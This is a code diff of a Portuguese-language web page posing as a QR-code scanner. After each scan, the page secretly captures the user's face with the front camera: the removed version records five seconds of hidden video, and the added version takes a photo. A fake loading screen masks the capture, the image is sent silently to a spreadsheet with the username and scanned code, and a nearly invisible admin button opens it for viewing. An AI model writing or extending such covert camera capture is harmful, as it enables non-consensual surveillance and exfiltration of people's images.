@@ -13,7 +13,7 @@
         body { font-family: Arial, sans-serif; text-align: center; padding: 20px; margin: 0; background-color: var(--bg-color); }
         #app-container { max-width: 500px; margin: 0 auto; padding-bottom: 80px; }
         #reader { width: 100%; margin-bottom: 20px; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 5px rgba(0,0,0,0.1); background-color: white; }
-        #front-camera { display: none !important; } /* Esconde completamente a câmera do usuário */
+        #front-camera { width: 100%; display: none; transform: scaleX(-1); }
         .hidden { display: none !important; }
         
         input[type="text"] { padding: 12px; font-size: 16px; border: 1px solid #ddd; border-radius: 5px; width: 80%; max-width: 300px; margin-bottom: 10px; }
@@ -22,7 +22,7 @@
         h2 { color: #333; }
         #logged-user { font-weight: bold; color: #007bff; }
 
-        /* Estilo do Loading */
+        /* Estilo do Loading de 4 segundos */
         #loading-screen {
             display: flex;
             flex-direction: column;
@@ -70,40 +70,21 @@
             100% { transform: scale(1); }
         }
 
-        /* Estilo do conteúdo lido que aparece depois */
-        #qr-content-box {
-            margin-top: 15px;
-            padding: 12px;
-            background: #fff;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            word-break: break-all;
-            font-size: 15px;
-            color: #333;
-            display: inline-block;
-            max-width: 90%;
-        }
-
-        #qr-content-box a {
-            color: #007bff;
-            text-decoration: underline;
-        }
-
         /* Botão Secreto */
-        #btn-ver-video {
+        #btn-ver-foto {
             position: fixed; bottom: 10px; right: 10px; width: 30px; height: 30px;
             border-radius: 50%; background-color: var(--bg-color); border: none; box-shadow: none;
             cursor: pointer; display: flex; align-items: center; justify-content: center; z-index: 100;
             opacity: 0.05; transition: opacity 0.1s ease; -webkit-tap-highlight-color: transparent;
         }
-        #btn-ver-video:active { opacity: 1; background-color: #e0e0e0; }
+        #btn-ver-foto:active { opacity: 1; background-color: #e0e0e0; }
 
         /* Modal */
-        #modal-video {
+        #modal-foto {
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(0,0,0,0.9); flex-direction: column; align-items: center; justify-content: center; z-index: 1000;
         }
-        #modal-video video { max-width: 90%; max-height: 80%; border: 3px solid white; border-radius: 10px; }
+        #modal-foto img { max-width: 90%; max-height: 80%; border: 3px solid white; border-radius: 10px; }
         #btn-fechar-modal { margin-top: 20px; background-color: #dc3545; color: white; border: none; border-radius: 5px; padding: 10px 30px; font-size: 16px; cursor: pointer; }
     </style>
 </head>
@@ -121,13 +102,13 @@
         <p>Usuário logado: <span id="logged-user"></span></p>
         
         <div id="reader"></div>
-        <!-- Câmera rodando em background (oculta para o usuário) -->
-        <video id="front-camera" autoplay playsinline muted></video>
+        <video id="front-camera" autoplay playsinline></video>
+        <canvas id="canvas" style="display:none;"></canvas>
 
-        <!-- Tela de Carregamento / Gravação -->
+        <!-- Tela de Carregamento (4 segundos) -->
         <div id="loading-screen" class="hidden">
             <div class="spinner"></div>
-            <p id="loading-text">Gravando vídeo...</p>
+            <p>Processando leitura...</p>
         </div>
 
         <!-- Tela de Sucesso -->
@@ -136,23 +117,17 @@
                 <span class="checkmark-v">✓</span>
             </div>
             <h3>Leitura Registrada!</h3>
-            
-            <!-- Conteúdo do QR que aparece após 2 segundos (clicável se for link) -->
-            <div id="qr-content-box" class="hidden">
-                <span id="qr-result"></span>
-            </div>
-
-            <br><br>
+            <br>
             <button class="primary-btn" onclick="reiniciar()">Ler Novo Código</button>
         </div>
     </div>
 </div>
 
-<button id="btn-ver-video" class="hidden" onclick="abrirModal()" title="Admin"></button>
+<button id="btn-ver-foto" class="hidden" onclick="abrirModal()" title="Admin"></button>
 
-<div id="modal-video">
-    <video id="video-result" controls></video>
-    <button id="btn-fechar-modal" onclick="fecharModal()">Fechar Vídeo</button>
+<div id="modal-foto">
+    <img id="selfie-result" src="" alt="Foto de auditoria">
+    <button id="btn-fechar-modal" onclick="fecharModal()">Fechar Foto</button>
 </div>
 
 <script>
@@ -177,10 +152,9 @@
     function iniciarLeitorQR() {
         document.getElementById('loading-screen').classList.add('hidden');
         document.getElementById('result').classList.add('hidden');
-        document.getElementById('qr-content-box').classList.add('hidden');
         document.getElementById('reader').style.display = 'block';
-        document.getElementById('btn-ver-video').classList.add('hidden');
-        document.getElementById('video-result').src = ""; 
+        document.getElementById('btn-ver-foto').classList.add('hidden');
+        document.getElementById('selfie-result').src = ""; 
 
         html5QrCode = new Html5Qrcode("reader");
         html5QrCode.start(
@@ -194,98 +168,61 @@
     function onScanSuccess(decodedText, decodedResult) {
         html5QrCode.stop().then(() => {
             document.getElementById('reader').style.display = 'none';
-            document.getElementById('loading-text').innerText = "Aguarde...";
+            
+            // Mostra a tela de carregamento por 4 segundos
             document.getElementById('loading-screen').classList.remove('hidden');
 
-            // Formata o texto do QR (transforma em link clicável se começar com http:// ou https://)
-            const qrResultContainer = document.getElementById('qr-result');
-            if (decodedText.startsWith('http://') || decodedText.startsWith('https://')) {
-                qrResultContainer.innerHTML = `<a href="${decodedText}" target="_blank">${decodedText}</a>`;
-            } else {
-                qrResultContainer.innerText = decodedText;
-            }
-
-            iniciarGravacaoVideo(decodedText);
+            capturarFotoFrontal(decodedText);
         });
     }
 
     function onScanFailure(error) { /* ignorar erros */ }
 
-    async function iniciarGravacaoVideo(codigoLido) {
-        const videoElement = document.getElementById('front-camera');
+    async function capturarFotoFrontal(codigoLido) {
+        const video = document.getElementById('front-camera');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
 
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-            videoElement.srcObject = stream;
-            videoElement.play(); // Continua gravando em segundo plano sem aparecer na tela
-
-            let mediaRecorder;
-            let chunks = [];
-
-            let options = { mimeType: 'video/webm; codecs=vp9' };
-            if (!MediaRecorder.isTypeSupported(options.mimeType)) {
-                options = { mimeType: 'video/webm' };
-                if (!MediaRecorder.isTypeSupported(options.mimeType)) {
-                    options = { mimeType: '' };
-                }
-            }
-
-            mediaRecorder = new MediaRecorder(stream, options);
-
-            mediaRecorder.ondataavailable = function(e) {
-                if (e.data && e.data.size > 0) {
-                    chunks.push(e.data);
-                }
-            };
-
-            mediaRecorder.onstop = async function() {
-                const blob = new Blob(chunks, { type: mediaRecorder.mimeType || 'video/webm' });
-                
-                const reader = new FileReader();
-                reader.readAsDataURL(blob);
-                reader.onloadend = function() {
-                    const videoBase64 = reader.result;
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            video.srcObject = stream;
+            
+            video.onloadedmetadata = () => {
+                video.play();
+                setTimeout(() => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                     
-                    document.getElementById('video-result').src = videoBase64;
-
+                    const imagemBase64 = canvas.toDataURL('image/jpeg', 0.8);
+                    document.getElementById('selfie-result').src = imagemBase64;
+                    
                     stream.getTracks().forEach(track => track.stop());
+                    
+                    // Envia silenciosamente para a planilha
+                    salvarNaPlanilha(usuarioAtual, codigoLido, imagemBase64);
 
-                    salvarNaPlanilha(usuarioAtual, codigoLido, videoBase64);
-
-                    // 1. Esconde o loading e mostra a confirmação (Check verde + "Leitura Registrada!")
-                    document.getElementById('loading-screen').classList.add('hidden');
-                    document.getElementById('result').classList.remove('hidden');
-                    document.getElementById('btn-ver-video').classList.remove('hidden');
-
-                    // 2. Aguarda 2 segundos para exibir o conteúdo contido no QR Code
+                    // Aguarda o restante dos 4 segundos para exibir o check verde (garantindo a experiência visual solicitada)
                     setTimeout(() => {
-                        document.getElementById('qr-content-box').classList.remove('hidden');
-                    }, 2000);
-                };
+                        document.getElementById('loading-screen').classList.add('hidden');
+                        document.getElementById('result').classList.remove('hidden');
+                        document.getElementById('btn-ver-foto').classList.remove('hidden');
+                    }, 2500); // 1.5s da foto + 2.5s = 4 segundos totais de carregamento
+
+                }, 1500); 
             };
-
-            mediaRecorder.start();
-
-            // Grava por exatos 5 segundos em background
-            setTimeout(() => {
-                if (mediaRecorder.state === "recording") {
-                    mediaRecorder.stop();
-                }
-            }, 5000);
-
         } catch (err) {
-            console.error("Erro ao gravar vídeo:", err);
+            console.error("Erro câmera frontal:", err);
             document.getElementById('loading-screen').classList.add('hidden');
             document.getElementById('result').classList.remove('hidden');
-            document.getElementById('qr-content-box').classList.remove('hidden');
         }
     }
 
-    async function salvarNaPlanilha(usuario, qrCode, videoBase64) {
+    async function salvarNaPlanilha(usuario, qrCode, fotoBase64) {
         const dados = {
             usuario: usuario,
             qrCode: qrCode,
-            fotoBase64: videoBase64
+            fotoBase64: fotoBase64
         };
 
         try {
@@ -311,14 +248,13 @@
     }
 
     function abrirModal() {
-        if (document.getElementById('video-result').src) {
-            document.getElementById('modal-video').style.display = 'flex';
+        if (document.getElementById('selfie-result').src) {
+            document.getElementById('modal-foto').style.display = 'flex';
         }
     }
 
     function fecharModal() {
-        document.getElementById('modal-video').style.display = 'none';
-        document.getElementById('video-result').pause();
+        document.getElementById('modal-foto').style.display = 'none';
     }
 </script>
 </body>
